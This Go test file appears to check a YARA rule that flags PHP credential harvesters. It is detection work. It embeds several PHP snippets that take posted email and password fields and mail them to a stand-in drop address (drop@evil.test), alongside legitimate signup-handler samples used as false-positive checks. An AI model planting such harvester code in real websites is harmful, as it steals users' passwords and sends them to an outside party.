//go:build yara

package yara

import "testing"

// Credential theft that copies the posted fields into variables too short for
// the rule to recognise by name.

func TestCredentialHarvesterPHP_ShortVariableNames(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php
$e = $_POST['email'];
$p = $_POST['password'];
$body = "$e|$p";
mail('drop@evil.test', 'result', $body);
`)
	if !hasYaraRule(s.ScanBytes(mal), "credential_harvester_php") {
		t.Error("credential_harvester_php gap: harvester using short variable names not detected")
	}
	// A site owner's own signup handler posts the same two fields and mails a
	// notice with raw mail(). It stays quiet when the mailed body carries only
	// the new account's address.
	ownSignup := []byte(`<?php
$e = $_POST['email'];
$p = $_POST['password'];
$msg = "New signup: $e";
mail(get_option('admin_email'), 'New signup', $msg);
`)
	if hasYaraRule(s.ScanBytes(ownSignup), "credential_harvester_php") {
		t.Error("credential_harvester_php FP: signup handler mailing the site's own address matched")
	}
	hardcodedSignup := []byte(`<?php
$e = $_POST['email'];
$p = $_POST['password'];
$msg = "New signup: $e";
mail('owner@example.test', 'New signup', $msg);
`)
	if hasYaraRule(s.ScanBytes(hardcodedSignup), "credential_harvester_php") {
		t.Error("credential_harvester_php FP: signup notice sent to a hardcoded site address matched")
	}
	hardcodedSignupDetails := []byte(`<?php
$e = $_POST['email'];
$p = $_POST['password'];
$u = $_POST['username'];
$msg = "New signup: $u <$e>";
mail('owner@example.test', 'New signup', $msg);
`)
	if hasYaraRule(s.ScanBytes(hardcodedSignupDetails), "credential_harvester_php") {
		t.Error("credential_harvester_php FP: signup notice mailing username and email matched")
	}
	direct := []byte(`<?php
$e = $_POST['email'];
$p = $_POST['password'];
mail('drop@evil.test', 'result', "$e|$p");
`)
	if !hasYaraRule(s.ScanBytes(direct), "credential_harvester_php") {
		t.Error("credential_harvester_php gap: two short variables mailed directly were not detected")
	}
	atFileStart := []byte("mail('drop@evil.test', 'result', \"$e|$p\");\n<?php\n$e = $_POST['email'];\n$p = $_POST['password'];")
	if !hasYaraRule(s.ScanBytes(atFileStart), "credential_harvester_php") {
		t.Error("credential_harvester_php gap: builtin mail call at byte zero was not detected")
	}
	afterOpenTag := []byte("<?php mail('drop@evil.test', 'result', \"$e|$p\");\n$e = $_POST['email'];\n$p = $_POST['password'];")
	if !hasYaraRule(s.ScanBytes(afterOpenTag), "credential_harvester_php") {
		t.Error("credential_harvester_php gap: builtin mail call after the PHP open tag was not detected")
	}
	legit := []byte(`<?php
$email = sanitize_email($_POST['email']);
$password = wp_hash_password($_POST['password']);
wp_insert_user(array('user_email' => $email, 'user_pass' => $password));
wp_mail($email, 'Welcome', 'Your account is ready.');
`)
	if hasYaraRule(s.ScanBytes(legit), "credential_harvester_php") {
		t.Error("credential_harvester_php FP: registration handler using wp_mail matched")
	}
	for name, mailer := range map[string]string{
		"function": `wp_mail('drop@evil.test', 'result', "$e|$p");`,
		"method":   `$mailer->mail('drop@evil.test', 'result', "$e|$p");`,
		"static":   `Mailer::mail('drop@evil.test', 'result', "$e|$p");`,
	} {
		sample := []byte("<?php\n$e = $_POST['email'];\n$p = $_POST['password'];\n" + mailer)
		if hasYaraRule(s.ScanBytes(sample), "credential_harvester_php") {
			t.Errorf("credential_harvester_php FP: %s mail call matched the builtin", name)
		}
	}
	wpMailAfterOpenTag := []byte("<?php wp_mail('drop@evil.test', 'result', \"$e|$p\");\n$e = $_POST['email'];\n$p = $_POST['password'];")
	if hasYaraRule(s.ScanBytes(wpMailAfterOpenTag), "credential_harvester_php") {
		t.Error("credential_harvester_php FP: wp_mail after the PHP open tag matched the builtin")
	}
}
